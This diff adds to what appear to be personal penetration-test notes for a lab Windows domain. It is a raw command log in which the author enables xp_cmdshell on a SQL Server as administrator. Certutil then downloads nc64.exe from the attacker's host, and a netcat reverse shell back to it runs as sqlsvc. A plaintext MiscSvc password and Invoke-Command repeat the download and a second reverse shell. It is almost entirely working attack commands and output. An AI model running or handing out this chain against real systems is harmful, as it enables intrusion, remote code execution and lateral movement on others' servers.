@@ -464,3 +464,90 @@ PS /home/ed> Install-Module -Name PSWSMan -Scope AllUsers
 PS /home/ed> Install-WSMan                                     
 WARNING: WSMan libs have been installed, please restart your PowerShell session to enable it in PowerShell    
 PS /home/ed> exit
+
+for some reason, cannot login , show me the errors
+
+─$ impacket-mssqlclient -k dc1.scrm.local
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+SQL (SCRM\administrator  dbo@master)> xp_cmdshell whoami;
+ERROR(DC1): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
+
+SQL (SCRM\administrator  dbo@master)> enable_xp_cmdshell
+INFO(DC1): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+INFO(DC1): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+
+SQL (SCRM\administrator  dbo@master)> xp_cmdshell dir C:\Users;
+output                                               
+--------------------------------------------------   
+ Volume in drive C has no label.                     
+
+ Volume Serial Number is 5805-B4B6                   
+
+NULL                                                 
+
+ Directory of C:\Users                               
+
+NULL                                                 
+
+05/11/2021  14:56    <DIR>          .                
+
+05/11/2021  14:56    <DIR>          ..               
+
+05/11/2021  21:28    <DIR>          administrator    
+
+03/11/2021  19:31    <DIR>          miscsvc          
+
+26/01/2020  17:54    <DIR>          Public           
+
+01/06/2022  13:58    <DIR>          sqlsvc           
+
+               0 File(s)              0 bytes        
+
+               6 Dir(s)  16,006,635,520 bytes free   
+
+NULL   
+
+
+SQL (SCRM\administrator  dbo@master)> xp_cmdshell certutil.exe -urlcache -f http://10.10.16.42:/nc64.exe C:\Users\sqlsvc\nc64.exe
+output                                                
+---------------------------------------------------   
+****  Online  ****                                    
+
+CertUtil: -URLCache command completed successfully.  
+
+SQL (SCRM\administrator  dbo@master)> xp_cmdshell "C:\Users\sqlsvc\nc64.exe 10.10.16.42 8821 -e cmd.exe"
+
+└─$ nc -nvlp 8821                              
+listening on [any] 8821 ...
+connect to [10.10.16.42] from (UNKNOWN) [10.129.188.251] 51594
+Microsoft Windows [Version 10.0.17763.2989]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+scrm\sqlsvc
+
+
+PS C:\Users> $SecPassword = ConvertTo-SecureString 'ScrambledEggs9900' -AsPlainText -Force
+$SecPassword = ConvertTo-SecureString 'ScrambledEggs9900' -AsPlainText -Force
+PS C:\Users> $Cred = New-Object System.Management.Automation.PSCredential('scrm.local\MiscSvc', $SecPassword)
+$Cred = New-Object System.Management.Automation.PSCredential('scrm.local\MiscSvc', $SecPassword)
+PS C:\Users> Invoke-Command -Computer 127.0.0.1 -Credential $Cred -ScriptBlock { whoami }
+Invoke-Command -Computer 127.0.0.1 -Credential $Cred -ScriptBlock { whoami }
+scrm\miscsvc
+
+
+Invoke-Command -Computer 127.0.0.1 -Credential $Cred -ScriptBlock { certutil.exe -urlcache -f http://10.10.16.42:/nc64.exe C:\Users\miscsvc\nc64.exe}
+
+Invoke-Command -Computer 127.0.0.1 -Credential $Cred -ScriptBlock { C:\Users\miscsvc\nc64.exe 10.10.16.42 8822 -e cmd.exe}
+
+└─$ nc -nvlp 8822            
+listening on [any] 8822 ...
+connect to [10.10.16.42] from (UNKNOWN) [10.129.188.251] 59592
+Microsoft Windows [Version 10.0.17763.2989]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\miscsvc\Documents>whoami
+whoami
+scrm\miscsvc
